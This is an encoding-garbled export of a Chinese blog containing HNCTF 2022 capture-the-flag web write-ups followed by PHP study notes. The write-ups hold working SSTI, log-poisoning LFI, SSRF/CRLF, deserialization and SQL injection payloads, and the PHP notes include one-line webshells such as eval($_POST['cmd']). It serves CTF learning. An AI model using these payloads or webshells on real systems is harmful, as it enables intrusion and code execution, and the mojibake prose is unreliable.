è¯´æ˜¯æ‰‹æœºå·ç™»é™†ï¼Œéšä¾¿è¾“äº†ä¸€ä¸‹ï¼Œå‘ç°æœ€å¤§é•¿åº¦é™åˆ¶ä¸º10ï¼Œé‚£è‚¯å®šä¸ç¬¦åˆæ‰‹æœºå·ä½æ•°ï¼Œå°è¯•bpæŠ“åŒ…ä¸€ä¸‹ä¿®æ”¹ï¼Œå¦‚ä¸‹å›¾ï¼ŒæˆåŠŸ Week1-What is Web æºç æ‰¾åˆ°flag Week1-Interesting_http ç®€å•çš„httpåè®®ï¼Œæ²¡å•¥è¯´çš„ Week1-easy_upload æ–‡ä»¶ä¸Šä¼ æ— è¿‡æ»¤ Week1-Challenge__rce å¾ˆè¯¦ç»†çš„ä¸€ç¯‡æ–‡ç« ï¼Œè®¤çœŸçœ‹èƒ½å­¦åˆ° ä»CTFShow[RCEæŒ‘æˆ˜]ä¸­å­¦ä¹ æ— å­—æ¯æ•°å­—æ„é€ webshell ![image-20240513103240377](D:\\blog\\Hexo\\source_posts\\HNCTF 2022\\image-20240513103240377.png) WEEK2-ez_SSTI æ— è¿‡æ»¤SSTIï¼Œpayloadå¦‚ä¸‹Â· {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }} {{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }} {{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }} # Or in the shotest versions: {{ cycler.__init__.__globals__.os.popen('id').read() }} {{ joiner.__init__.__globals__.os.popen('id').read() }} {{ namespace.__init__.__globals__.os.popen('id').read() }} å‚è€ƒæ–‡ç«  Server Side Template Injection SSTI (Server Side Template Injection) WEEK2-easy_include &lt;?php //WEBæ‰‹è¦æ‡‚å¾—æœç´¢ if(isset($_GET['file'])){ $file = $_GET['file']; if(preg_match(\"/php|flag|data|\\~|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\-|\\_|\\+|\\=/i\", $file)){ die(\"error\"); } include($file); }else{ highlight_file(__FILE__); } çœ‹åˆ°è¿™é‡Œè¿‡æ»¤çš„æŒºä¸¥ï¼Œæˆ‘æ„Ÿè§‰ä¸èƒ½ç»•è¿‡ï¼ŒåŠ ä¸Šé¢˜ç›®æç¤ºè¦æœç´¢ï¼Œæƒ³ç€æœé›†ä¸€æ‰‹æ–‡ä»¶ä¸Šä¼ getshellï¼Œå‘ç°æ—¥å¿—æ–‡ä»¶åŒ…å«getshellå¯èƒ½æ€§å¤§ï¼Œä¸”è¯¥ç«™ç‚¹ä¹Ÿæ˜¯nginxï¼Œç›´æ¥å°è¯•éå†é…ç½®æ–‡ä»¶ ?file=../../../../etc/nginx/nginx.conf //å‘ç°é”™è¯¯æ—¥å¿—æ–‡ä»¶ï¼Œä¹Ÿå°±èƒ½çŒœè§£å‡ºè®¿é—®æ—¥å¿—æ–‡ä»¶è·¯å¾„ ?file=../../../../var/log/nginx/access.log //å‘ç°å¯ä»¥è®¿é—® æ¯«æ— ç–‘é—®å°±æ˜¯æ—¥å¿—æ–‡ä»¶getshellï¼Œç›´æ¥bpè®¿é—®ä¸€æ‰‹ï¼ˆè¿™æ ·çš„è¯ï¼Œä»£ç ä¸ä¼šè¢«ç¼–ç ï¼‰ æ¥ç€è®¿é—®access.logï¼Œå‘½ä»¤æ‰§è¡Œå³å¯1=system('cat /ffflllaaaggg'); å‚è€ƒæ–‡ç«  æ–‡ä»¶åŒ…å«æ¼æ´çš„åº”ç”¨ä¸ç»•è¿‡æŠ€å·§ã€é˜²å¾¡æ–¹æ³• WEEK2-ez_ssrf ![image-20240506142941394](D:\\blog\\Hexo\\source_posts\\HNCTF 2022\\image-20240506142941394.png) æ‰«æç›®å½•å‘ç°å­˜åœ¨flag.phpï¼Œè®¿é—®æç¤ºæˆ‘ä»¬è¦ä»¥å†…ç½‘åœ°å€è®¿é—®çš„æ„æ€ ![image-20240506143031666](D:\\blog\\Hexo\\source_posts\\HNCTF 2022\\image-20240506143031666.png) plzä¸ç†è§£ä»€ä¹ˆé¬¼ï¼Œæ¥ç€åˆ†æä»£ç  &lt;?php highlight_file(__FILE__); error_reporting(0); $data=base64_decode($_GET['data']); $host=$_GET['host']; $port=$_GET['port']; $fp=fsockopen($host,intval($port),$error,$errstr,30); //ä¸æŒ‡å®šçš„ç½‘å€å»ºç«‹é“¾æ¥ if(!$fp) { die(); } else { fwrite($fp,$data); //å»ºç«‹æˆåŠŸåï¼Œé€šè¿‡fwriteå†™å…¥dataæ•°æ® while(!feof($data)) { echo fgets($fp,128);//æœåŠ¡ç«¯å›æ˜¾æ•°æ® } fclose($fp); } é‚£åŸºæœ¬å°±æ˜¯ä»¥å†…ç½‘åœ°å€èº«ä»½å»è®¿é—®flag.phpï¼Œç„¶åå†…ç½‘æœåŠ¡ä¼šå°†è¯¥è¯·æ±‚å¯¹åº”çš„æ•°æ®å›æ˜¾å‡ºæ¥ï¼Œç”¨åˆ°CRLFæ³¨å…¥ ç›´æ¥æ„é€ payloadç¼–ç å³å¯ import base64 payload = \"GET /flag.php HTTP/1.1\\r \" payload += \"Host: 127.0.0.1:80\\r \" payload += \"Connection: close\\r \\r \" print(base64.b64encode(payload.encode())) ![image-20240506144528215](D:\\blog\\Hexo\\source_posts\\HNCTF 2022\\image-20240506144528215.png) WEEK2-Canyource &lt;?php highlight_file(__FILE__); if(isset($_GET['code'])&amp;&amp;!preg_match('/url|show|high|na|info|dec|oct|pi|log|data:\\/\\/|filter:\\/\\/|php:\\/\\/|phar:\\/\\//i', $_GET['code'])){ if(';' === preg_replace('/[^\\W]+\\((?R)?\\)/', '', $_GET['code'])) { eval($_GET['code']);} else die('nonono');} else echo('please input code'); ?&gt; please input code å¤ªèœï¼Œæ²¡æƒ³åˆ°æ˜¯æ— å‚RCEï¼Œ/[^\\W]+\\((?R)?\\)/è¿™é‡Œå°±æ˜¯è¿‡æ»¤äº†é‚£äº›å¸¦å‚æ•°çš„å‡½æ•°ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦åˆ©ç”¨ä¸éœ€è¦å‚æ•°çš„å‡½æ•°ï¼Œè¿™é‡Œè¿‡æ»¤å¾ˆå°‘ï¼Œå› æ­¤ç”¨ä¸€ä¸ªgetallheaders()å³å¯ï¼Œè¿™ä¸ªå‡½æ•°è·å–httpå¤´ï¼Œè¿”å›ä¸€ä¸ªæ•°ç»„ï¼Œä¸”æ•°ç»„çš„å…ƒç´ ä¾æ¬¡æ˜¯ä»HTTPå¤´ä»ä¸‹å¾€ä¸Šèµ°ã€‚å› æ­¤è¿™æ ·æ„é€  ![image-20240506150526811](D:\\blog\\Hexo\\source_posts\\HNCTF 2022\\image-20240506150526811.png) WEEK2-easy_unser &lt;?php include 'f14g.php'; error_reporting(0); highlight_file(__FILE__); class body{ private $want,$todonothing = \"i can't get you want,But you can tell me before I wake up and change my mind\"; public function __construct($want){ $About_me = \"When the object is created,I will be called\"; if($want !== \" \") $this-&gt;want = $want; else $this-&gt;want = $this-&gt;todonothing; } function __wakeup(){ $About_me = \"When the object is unserialized,I will be called\"; $but = \"I can CHANGE you\"; $this-&gt; want = $but; echo \"C1ybaby!\"; } function __destruct(){ $About_me = \"I'm the final function,when the object is destroyed,I will be called\"; echo \"So,let me see if you can get what you want \"; if($this-&gt;todonothing === $this-&gt;want) die(\"é²å‹ƒ,åˆ«å‚»æ„£ç€! \"); if($this-&gt;want == \"I can CHANGE you\") die(\"You are not you....\"); if($this-&gt;want == \"f14g.php\" OR is_file($this-&gt;want)){ die(\"You want my heart?No way! \"); }else{ echo \"You got it!\"; highlight_file($this-&gt;want); } } } class unserializeorder{ public $CORE = \"äººç±»æœ€å¤§çš„æ•Œäºº,å°±æ˜¯æ— åº. Yahi param vaastavikta hai!&lt;BR&gt;\"; function __sleep(){ $About_me = \"When the object is serialized,I will be called\"; echo \"We Come To HNCTF,Enjoy the ser14l1zti0n &lt;BR&gt;\"; } function __toString(){ $About_me = \"When the object is used as a string,I will be called\"; return $this-&gt;CORE; } } $obj = new unserializeorder(); echo $obj; $obj = serialize($obj); if (isset($_GET['ywant'])) { $ywant = @unserialize(@$_GET['ywant']); echo $ywant; } ?&gt; äººç±»æœ€å¤§çš„æ•Œäºº,å°±æ˜¯æ— åº. Yahi param vaastavikta hai! We Come To HNCTF,Enjoy the ser14l1zti0n æ€è·¯ç®€å•ï¼Œå°±æ˜¯ç»•è¿‡wakeupä»¥åŠå…¶ä¸­çš„is_fileï¼Œç™¾åº¦å³å¯çŸ¥é“ä¼ªåè®®å¯ç»•è¿‡is_fileï¼Œé‚£ç›´æ¥å†™pop &lt;?php class body { private $want, $todonothing = \"\"; public function __construct($want){ if($want !== \" \") $this-&gt;want = $want; else $this-&gt;want = $this-&gt;todonothing; } } $payload = \"php://filter/convert.base64-encode/resource=f14g.php\"; $pop = new body($payload); echo serialize($pop).\" \"; $result = preg_replace(\"/:2:{/\",\":3:{\", serialize($pop)); echo $result.\" \"; echo urlencode($result); ![image-20240506155456477](D:\\blog\\Hexo\\source_posts\\HNCTF 2022\\image-20240506155456477.png) WEEK2-easy_sql å­¦åˆ°çš„ï¼š å‰æï¼šå¦‚æœwafæˆ–å…¶å®ƒè¿‡æ»¤äº†information_schemaå…³é”®å­—ï¼Œé‚£æˆ‘ä»¬è¯¥å¦‚ä½•è·å–å…ƒæ•°æ®å‘¢ï¼Ÿ èƒ½å¤Ÿä»£æ›¿information_schemaçš„æœ‰ï¼š sys.schema_auto_increment_columns sys.schema_table_statistics_with_buffer x$schema_table_statistics_with_buffer mysql.innodb_table_stats mysql.innodb_table_index ä»¥ä¸Šå¤§éƒ¨åˆ†ç‰¹æ®Šæ•°æ®åº“éƒ½æ˜¯åœ¨ mysql5.7 ä»¥åçš„ç‰ˆæœ¬æ‰æœ‰ï¼Œå¹¶ä¸”è¦è®¿é—®sysæ•°æ®åº“éœ€è¦æœ‰ç›¸åº”çš„æƒé™ã€‚ä½†æ˜¯è¿™äº›è¡¨ä¸­ä¸€èˆ¬éƒ½æ²¡æœ‰å­—æ®µåï¼Œåªèƒ½è·å¾—è¡¨åï¼Œæ‰€ä»¥å½“æˆ‘ä»¬çŸ¥é“è¡¨æ˜ä¹‹åï¼Œè¿˜éœ€è¦è¿›ä¸€æ­¥åœ°ä½¿ç”¨æ— åˆ—åæ³¨å…¥ id=0'union/**/select/**/1,2,group_concat(database_name)/**/from/**/mysql.innodb_table_stats/**/where/**/'1 ![image-20240513121429703](D:\\blog\\Hexo\\source_posts\\HNCTF 2022\\image-20240513121429703.png) id=0'union/**/select/**/1,2,group_concat(`1`)/**/from/**/(select/**/1/**/union/**/select/**/*/**/from/**/ctftraining.flag)a/**/where/**/'1 ![image-20240513122017526](D:\\blog\\Hexo\\source_posts\\HNCTF 2022\\image-20240513122017526.png) å¯å‚è€ƒï¼šctfæ— åˆ—åæ³¨å…¥å°ç»“ WEEK3-ssssti ![image-20240506152323796](D:\\blog\\Hexo\\source_posts\\HNCTF 2022\\image-20240506152323796.png) fuzzä¸€æ³¢å‘ç°è¿‡æ»¤äº†_ã€argsã€å•åŒå¼•å·ç­‰ç­‰ï¼Œè¿™é‡Œpayloadå¾ˆå¤šï¼Œæ ¹æ®é»‘åå•æ¢å³å¯","tags":["CTFèµ›äº‹"],"categories":["CTFèµ›äº‹"]},{"title":"PHPå­¦ä¹ æ€»ç»“","path":"/2024/04/23/php-xue-xi-zong-jie/","content":"0x01 PHPåŸºç¡€çŸ¥è¯† å…³äºè¿™ä¸€å—å„¿ï¼Œå½“åˆåœ¨èœé¸Ÿä¹Ÿå­¦ä¹ è¿‡ï¼Œè¿™é‡Œä¹Ÿä¸æƒ³åœ¨èµ˜è¿°ï¼Œå¯ä»¥è¯´æ˜¯æ‡’å§ï¼Œå°±è®°å½•ä¸€äº›æˆ‘è®¤ä¸ºé‡ç‚¹çš„ æ€è·¯ä¸»è¦è¿˜æ˜¯å…ˆäº†è§£ï¼Œèƒ½ç®€å•å®è·µå°±å®è·µï¼Œåˆ°äº†ä»£ç å®¡è®¡çš„æ—¶å€™ï¼Œåœ¨é‡åˆ°ä»€ä¹ˆè§£å†³ä»€ä¹ˆ PHP è¿è¡Œå‘½ä»¤ $ php hello.php å˜é‡ Variables $boolean1 = true; $boolean2 = True; $int = 12; $float = 3.1415926; unset($float); // åˆ é™¤å˜é‡ $str1 = \"How are you?\"; $str2 = 'Fine, thanks'; å­—ç¬¦ä¸² Strings $url = \"jaywcjlove.github.io\"; echo \"I'm learning PHP at $url\"; // è¿æ¥å­—ç¬¦ä¸² echo \"I'm learning PHP at \" . $url; $hello = \"Hello, \"; $hello .= \"World!\"; echo $hello; # =&gt; Hello, World! åŒ…å« Include &lt;?php include 'vars.php'; echo $fruit . \" \"; # =&gt; apple /* ä¸ include ç›¸åŒï¼Œ å¦‚æœä¸èƒ½åŒ…å«åˆ™å¯¼è‡´é”™è¯¯*/ require 'vars.php'; // ä¹Ÿæœ‰æ•ˆ include('vars.php'); require('vars.php'); // é€šè¿‡ HTTP åŒ…å« include 'http://x.com/file.php'; // åŒ…å«å’Œè¿”å›è¯­å¥ $result = include 'vars.php'; echo $result; # =&gt; Anything you like. ?&gt; æ•´æ•° Integer $int1 = 28; # =&gt; 28 $int2 = -32; # =&gt; -32 $int3 = 012; # =&gt; 10 (octal) $int4 = 0x0F; # =&gt; 15 (hex) $int5 = 0b101; # =&gt; 5 (binary) $int6 = 2_000_100_000; # =&gt; 2000100000 (decimal, PHP 7.4.0) æµ®ç‚¹æ•° Float $float1 = 1.234; $float2 = 1.2e7; $float3 = 7E-10; $float4 = 1_234.567; // as of PHP 7.4.0 var_dump($float4); // float(1234.567) $float5 = 1 + \"10.5\"; # =&gt; 11.5 $float6 = 1 + \"-1.3e3\"; # =&gt; -1299 Null $a = null; $b = 'Hello php!'; echo $a ?? 'a is unset'; # =&gt; a is unset echo $b ?? 'b is unset'; # =&gt; Hello php $a = array(); $a == null # =&gt; true $a === null # =&gt; false is_null($a) # =&gt; false è¿™é‡Œçš„??ä¸ºç©ºåˆå¹¶è¿ç®—ç¬¦ ä¸Šè¿°PHPä»£ç æ˜¯ä¸€ä¸ªä½¿ç”¨äº†ç©ºåˆå¹¶è¿ç®—ç¬¦ï¼ˆnull coalescing operatorï¼‰çš„è¡¨è¾¾å¼ã€‚è¯¥ä»£ç ç”¨äºæ£€æŸ¥å˜é‡$aæ˜¯å¦å·²è®¾ç½®ï¼Œå¦‚æœå·²è®¾ç½®åˆ™è¿”å›å…¶å€¼ï¼Œå¦‚æœæœªè®¾ç½®åˆ™è¿”å›å­—ç¬¦ä¸² 'a is unset'ã€‚ ç©ºåˆå¹¶è¿ç®—ç¬¦ ?? æ˜¯åœ¨PHP 7ä¸­å¼•å…¥çš„ã€‚å®ƒçš„ä½œç”¨æ˜¯åˆ¤æ–­å·¦ä¾§è¡¨è¾¾å¼çš„å€¼æ˜¯å¦ä¸ºnullï¼Œå¦‚æœæ˜¯nullåˆ™è¿”å›å³ä¾§è¡¨è¾¾å¼çš„å€¼ï¼Œå¦åˆ™è¿”å›å·¦ä¾§è¡¨è¾¾å¼çš„å€¼ã€‚ åœ¨ä¸Šè¿°ä»£ç ä¸­ï¼Œ$a ?? 'a is unset' è¡¨è¾¾å¼ä¼šå…ˆåˆ¤æ–­å˜é‡$açš„å€¼æ˜¯å¦ä¸ºnullã€‚å¦‚æœ$aå·²è®¾ç½®ä¸”ä¸ä¸ºnullï¼Œåˆ™æ•´ä¸ªè¡¨è¾¾å¼çš„ç»“æœä¸º$açš„å€¼ã€‚å¦‚æœ$aæœªè®¾ç½®æˆ–ä¸ºnullï¼Œåˆ™æ•´ä¸ªè¡¨è¾¾å¼çš„ç»“æœä¸ºå­—ç¬¦ä¸² 'a is unset'ã€‚ è¿™æ ·çš„ä»£ç å¯ä»¥ç”¨äºæä¾›é»˜è®¤å€¼ï¼Œå½“å˜é‡æœªè®¾ç½®æ—¶ï¼Œå¯ä»¥è¿”å›ä¸€ä¸ªé¢„å®šä¹‰çš„å€¼ï¼Œä»¥é¿å…ä½¿ç”¨æœªå®šä¹‰çš„å˜é‡è€Œå¼•å‘é”™è¯¯ã€‚ å¤šè¡Œ Multi-line $str = \"foo\"; // æœªæ’å€¼çš„å¤šè¡Œ $nowdoc = &lt;&lt;&lt;'END' Multi line string $str END; // å°†æ‰§è¡Œå­—ç¬¦ä¸²æ’å€¼ $heredoc = &lt;&lt;&lt;END Multi line $str END; EOFç”¨æ³•ï¼Œä½¿ç”¨æ¦‚è¿°ï¼š å¿…é¡»åæ¥åˆ†å·ï¼Œå¦åˆ™ç¼–è¯‘é€šä¸è¿‡ã€‚ EOF å¯ä»¥ç”¨ä»»æ„å…¶å®ƒå­—ç¬¦ä»£æ›¿ï¼Œåªéœ€ä¿è¯ç»“æŸæ ‡è¯†ä¸å¼€å§‹æ ‡è¯†ä¸€è‡´ã€‚ ç»“æŸæ ‡è¯†å¿…é¡»é¡¶æ ¼ç‹¬è‡ªå ä¸€è¡Œ(å³å¿…é¡»ä»è¡Œé¦–å¼€å§‹ï¼Œå‰åä¸èƒ½è¡”æ¥ä»»ä½•ç©ºç™½å’Œå­—ç¬¦)ã€‚ å¼€å§‹æ ‡è¯†å¯ä»¥ä¸å¸¦å¼•å·æˆ–å¸¦å•åŒå¼•å·ï¼Œä¸å¸¦å¼•å·ä¸å¸¦åŒå¼•å·æ•ˆæœä¸€è‡´ï¼Œè§£é‡Šå†…åµŒçš„å˜é‡å’Œè½¬ä¹‰ç¬¦å·ï¼Œå¸¦å•å¼•å·åˆ™ä¸è§£é‡Šå†…åµŒçš„å˜é‡å’Œè½¬ä¹‰ç¬¦å·ã€‚ å½“å†…å®¹éœ€è¦å†…åµŒå¼•å·ï¼ˆå•å¼•å·æˆ–åŒå¼•å·ï¼‰æ—¶ï¼Œä¸éœ€è¦åŠ è½¬ä¹‰ç¬¦ï¼Œæœ¬èº«å¯¹å•åŒå¼•å·è½¬ä¹‰ï¼Œæ­¤å¤„ç›¸å½“ä¸qå’Œqqçš„ç”¨æ³•ã€‚ æ“ä½œ Manipulation $s = \"Hello Phper\"; echo strlen($s); # =&gt; 11 echo substr($s, 0, 3); # =&gt; Hel echo substr($s, 1); # =&gt; ello Phper echo substr($s, -4, 3);# =&gt; hpe echo strtoupper($s); # =&gt; HELLO PHPER echo strtolower($s); # =&gt; hello phper echo strpos($s, \"l\"); # =&gt; 2 var_dump(strpos($s, \"L\")); # =&gt; false æ··åˆ int å’Œ string é”® $array = array( \"foo\" =&gt; \"bar\", \"bar\" =&gt; \"foo\", 100 =&gt; -100, -100 =&gt; 100, ); var_dump($array); çŸ­æ•°ç»„è¯­æ³• $array = [ \"foo\" =&gt; \"bar\", \"bar\" =&gt; \"foo\", ]; æ“ä½œ $arr = array(5 =&gt; 1, 12 =&gt; 2); $arr[] = 56; // é™„åŠ  $arr[\"x\"] = 42; // ç”¨é”®æ·»åŠ  sort($arr); // æ’åº unset($arr[5]); // æ¶ˆé™¤ unset($arr); // ç§»é™¤æ‰€æœ‰ ä¸²è”é˜µåˆ— $a = [1, 2]; $b = [3, 4]; // PHP 7.4 ä»¥å # =&gt; [1, 2, 3, 4] $result = [...$a, ...$b]; åœ¨PHP 7.4åŠä»¥åçš„ç‰ˆæœ¬ä¸­ï¼Œ$result = [...$a, ...$b]; è¿™æ®µä»£ç ä½¿ç”¨äº†å±•å¼€è¿ç®—ç¬¦ï¼ˆspread operatorï¼‰æ¥å°†ä¸¤ä¸ªæ•°ç»„ $a å’Œ $b çš„å…ƒç´ åˆå¹¶åˆ°ä¸€ä¸ªæ–°çš„æ•°ç»„ $result ä¸­ã€‚ å±•å¼€è¿ç®—ç¬¦ ... å¯ä»¥å°†æ•°ç»„æ‹†åˆ†ä¸ºç‹¬ç«‹çš„å…ƒç´ ï¼Œå¹¶åœ¨æ•°ç»„å­—é¢é‡æˆ–å‡½æ•°è°ƒç”¨ä¸­ä½¿ç”¨ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œ[...$a, ...$b] è¡¨è¾¾å¼å°†ä¼šå±•å¼€æ•°ç»„ $a å’Œ $b çš„å…ƒç´ ï¼Œå¹¶å°†å®ƒä»¬åˆå¹¶åˆ°ä¸€ä¸ªæ–°çš„æ•°ç»„ä¸­ã€‚ ä¸‹é¢æ˜¯ä¸€ä¸ªç¤ºä¾‹æ¥è¯´æ˜è¿™æ®µä»£ç çš„å«ä¹‰ï¼š $a = [1, 2, 3]; $b = [4, 5, 6]; $result = [...$a, ...$b]; print_r($result); è¾“å‡ºç»“æœï¼š Array ( [0] =&gt; 1 [1] =&gt; 2 [2] =&gt; 3 [3] =&gt; 4 [4] =&gt; 5 [5] =&gt; 6 ) åœ¨ä¸Šè¿°ç¤ºä¾‹ä¸­ï¼Œ$a æ˜¯åŒ…å«å…ƒç´  [1, 2, 3] çš„æ•°ç»„ï¼Œ$b æ˜¯åŒ…å«å…ƒç´  [4, 5, 6] çš„æ•°ç»„ã€‚é€šè¿‡å±•å¼€è¿ç®—ç¬¦ ...ï¼Œ[...$a, ...$b] è¡¨è¾¾å¼å°†ä¼šå°†ä¸¤ä¸ªæ•°ç»„çš„å…ƒç´ åˆå¹¶åˆ°ä¸€ä¸ªæ–°çš„æ•°ç»„ä¸­ï¼Œå¾—åˆ°ç»“æœ $resultã€‚ å› æ­¤ï¼Œ$result çš„å€¼å°†æ˜¯ä¸€ä¸ªåŒ…å«æ‰€æœ‰ $a å’Œ $b å…ƒç´ çš„æ–°æ•°ç»„ [1, 2, 3, 4, 5, 6]ã€‚ Into å‡½æ•° $array = [1, 2]; function foo(int $a, int $b) { echo $a; # =&gt; 1 echo $b; # =&gt; 2 } foo(...$array); åœ¨è¿™é‡Œï¼ŒGPTè§£é‡Šæ˜¯â€¦$otherä»£è¡¨otheræ˜¯å¯å˜å‚æ•°ï¼Œå¯ä»¥æ¥å—å¤šä¸ªå‚æ•° Splatè¿ç®—ç¬¦ function foo($first, ...$other) { var_dump($first); # =&gt; a var_dump($other); # =&gt; ['b', 'c'] } foo('a', 'b', 'c'); // æˆ– function foo($first, string ...$other){} åŒ¹é…è¡¨è¾¾å¼ $age = 23; $result = match (true) { $age &gt;= 65 =&gt; 'senior', $age &gt;= 25 =&gt; 'adult', $age &gt;= 18 =&gt; 'young adult', default =&gt; 'kid', }; echo $result; # =&gt; young adult è¿”å›ç±»å‹ // åŸºæœ¬è¿”å›ç±»å‹å£°æ˜ function sum($a, $b): float {/*...*/} function get_item(): string {/*...*/} class C {} // è¿”å›ä¸€ä¸ªå¯¹è±¡ function getC(): C { return new C; } å¯ç©ºè¿”å›ç±»å‹ // åœ¨ PHP 7.1 ä¸­å¯ç”¨ function nullOrString(int $v) : ?string { return $v % 2 ? \"odd\" : null; } echo nullOrString(3); # =&gt; odd var_dump(nullOrString(4)); # =&gt; NULL å˜é‡å‡½æ•° function bar($arg = '') { echo \"In bar(); arg: '$arg'. \"; } $func = 'bar'; $func('test'); # =&gt; In bar(); arg: test åŒ¿åå‡½æ•° $greet = function($name) { printf(\"Hello %s\\r \", $name); }; $greet('World'); # =&gt; Hello World $greet('PHP'); # =&gt; Hello PHP ç®­å¤´å‡½æ•° $y = 1; $fn1 = fn($x) =&gt; $x + $y; // ç›¸å½“äºæŒ‰å€¼ä½¿ç”¨ $yï¼š $fn2 = function ($x) use ($y) { return $x + $y; }; echo $fn1(5); # =&gt; 6 echo $fn2(5); # =&gt; 6 Nullsafe è¿ç®—ç¬¦ // ä» PHP 8.0.0 å¼€å§‹ï¼Œè¿™ä¸€è¡Œï¼š $result = $repo?-&gt;getUser(5)?-&gt;name; // ç›¸å½“äºä¸‹é¢çš„ä»£ç ï¼š if (is_null($repo)) { $result = null; } else { $user = $result-&gt;getUser(5); if (is_null($user)) { $result = null; } else { $result = $user-&gt;name; } } PHP è¶…çº§å…¨å±€å˜é‡ $_SERVER $_SERVER æ˜¯ä¸€ä¸ªåŒ…å«äº†è¯¸å¦‚å¤´ä¿¡æ¯(header)ã€è·¯å¾„(path)ã€ä»¥åŠè„šæœ¬ä½ç½®(script locations)ç­‰ç­‰ä¿¡æ¯çš„æ•°ç»„ã€‚è¿™ä¸ªæ•°ç»„ä¸­çš„é¡¹ç›®ç”± Web æœåŠ¡å™¨åˆ›å»ºã€‚ä¸èƒ½ä¿è¯æ¯ä¸ªæœåŠ¡å™¨éƒ½æä¾›å…¨éƒ¨é¡¹ç›®ï¼›æœåŠ¡å™¨å¯èƒ½ä¼šå¿½ç•¥ä¸€äº›ï¼Œæˆ–è€…æä¾›ä¸€äº›æ²¡æœ‰åœ¨è¿™é‡Œåˆ—ä¸¾å‡ºæ¥çš„é¡¹ç›®ã€‚ ä»¥ä¸‹å®ä¾‹ä¸­å±•ç¤ºäº†å¦‚ä½•ä½¿ç”¨$_SERVERä¸­çš„å…ƒç´ : &lt;?php echo $_SERVER['PHP_SELF']; echo \"&lt;br&gt;\"; echo $_SERVER['SERVER_NAME']; echo \"&lt;br&gt;\"; echo $_SERVER['HTTP_HOST']; echo \"&lt;br&gt;\"; echo $_SERVER['HTTP_REFERER']; echo \"&lt;br&gt;\"; echo $_SERVER['HTTP_USER_AGENT']; echo \"&lt;br&gt;\"; echo $_SERVER['SCRIPT_NAME']; ?&gt; 0x02 PHPå±é™©å‡½æ•° å…ˆè·Ÿç€ç°æˆçš„æ–‡ç« æ€»ç»“ ä»£ç æ‰§è¡Œå‡½æ•° eval #ä¼ å…¥çš„å‚æ•°å¿…é¡»ä¸ºPHPä»£ç ï¼Œéœ€è¦ä»¥åˆ†å·ç»“å°¾ã€‚ #æ‰§è¡Œå¤šè¡Œä»£ç  eval(phpinfo()); eval($_POST['cmd']); assert #æ‰§è¡Œå•è¡Œä»£ç ï¼šä¸evalç±»ä¼¼ï¼Œå­—ç¬¦ä¸²è¢« assert() å½“åš PHP ä»£ç æ¥æ‰§è¡Œ assert($_POST['cmd']); evalä¸assertåŒºåˆ«ï¼š è‹¥ç»™ä¸€ä¸ªè¿™æ ·å½¢å¼çš„ä¸€å¥è¯æœ¨é©¬ï¼Œè¯¥å¦‚ä½•ä½¿ç”¨webshellè¿›è¡Œè¿æ¥å‘¢&lt;?php $_POST['1']($_POST['2']); ?&gt; å¦‚æœæƒ³é€šè¿‡evalå‡½æ•°æ¥å®Œæˆä¸€å¥è¯æœ¨é©¬çš„è¯ï¼Œä¸èƒ½ç›´æ¥1=eval&amp;2ç”¨è¿™ç§æ ¼å¼è¿æ¥ï¼ŒåŸå› æ˜¯evalæ˜¯ä¸€ä¸ªè¯­è¨€æ„é€ å™¨è€Œä¸æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œä¸èƒ½è¢«å¯å˜å‡½æ•°è°ƒç”¨ã€‚ PHP æ”¯æŒå¯å˜å‡½æ•°çš„æ¦‚å¿µã€‚è¿™æ„å‘³ç€å¦‚æœä¸€ä¸ªå˜é‡ååæœ‰åœ†æ‹¬å·ï¼ŒPHP å°†å¯»æ‰¾ä¸å˜é‡çš„å€¼åŒåçš„å‡½æ•°ï¼Œå¹¶ä¸”å°è¯•æ‰§è¡Œå®ƒã€‚å¯å˜å‡½æ•°å¯ä»¥ç”¨æ¥å®ç°åŒ…æ‹¬å›è°ƒå‡½æ•°ï¼Œå‡½æ•°è¡¨åœ¨å†…çš„ä¸€äº›ç”¨é€”ã€‚ å¯å˜å‡½æ•°ä¸èƒ½ç”¨äºä¾‹å¦‚ echoï¼Œprintï¼Œunset()ï¼Œisset()ï¼Œempty()ï¼Œincludeï¼Œrequire ä»¥åŠç±»ä¼¼çš„è¯­è¨€ç»“æ„ã€‚éœ€è¦ä½¿ç”¨è‡ªå·±çš„åŒ…è£…å‡½æ•°æ¥å°†è¿™äº›ç»“æ„ç”¨ä½œå¯å˜å‡½æ•°ã€‚è¿™ä¹ˆçœ‹æ¥evalå…¶å®å¹¶ä¸èƒ½ç®—æ˜¯â€˜å‡½æ•°â€™ï¼Œè€Œæ˜¯PHPè‡ªèº«çš„è¯­è¨€ç»“æ„ï¼Œå¦‚æœéœ€è¦ç”¨â€˜å¯å˜â€™çš„æ–¹å¼è°ƒç”¨ï¼Œéœ€è¦è‡ªå·±æ„é€ ï¼Œç±»ä¼¼è¿™æ ·å­çš„ï¼š &lt;?php function eval_1($str) { eval($str); } $a='eval_1'; $a('phpinfo()'); ?&gt; æ‰€ä»¥æˆ‘ä»¬éœ€è¦å€ŸåŠ©å…¶ä»–å‘½ä»¤æ‰§è¡Œå‡½æ•°å¦‚assertæ¥å®ç°ï¼Œç”¨1=assert(eval&amp;2)æœ€ç»ˆè½¬æ¢ä¸ºphpä»£ç ä¸ºassert(eval($_POST['2'])) å¦‚å›¾æ‰€ç¤ºæµ‹è¯•æˆåŠŸæ³¨æ„ï¼šæµ‹è¯•æ—¶éœ€è¦ç•™æ„ä½¿ç”¨phpçš„ç‰ˆæœ¬ï¼Œè‹¥ä½¿ç”¨ç‰ˆæœ¬è¶…è¿‡7.1åˆ™ä¼šè¿æ¥å¤±è´¥ã€‚åŸå› ä¸º æˆ‘ä»¬å¿…é¡»æ¸…æ¥šä¸€ç‚¹ï¼Œæˆ‘ä»¬çš„evalå‡½æ•°ä¸­å‚æ•°æ˜¯å­—ç¬¦ï¼Œassertå‡½æ•°ä¸­å‚æ•°ä¸ºè¡¨è¾¾å¼ ï¼ˆæˆ–è€…ä¸ºå‡½æ•°ï¼‰ preg_replace è¿™ä¸ªæœ‰ç‰ˆæœ¬é™åˆ¶ï¼šphp5.5ç‰ˆæœ¬ä¸Š/eå°±è¢«å¼ƒç”¨ mixed preg_replace ( mixed pattern, mixed replacement, mixed subject [, int limit]) 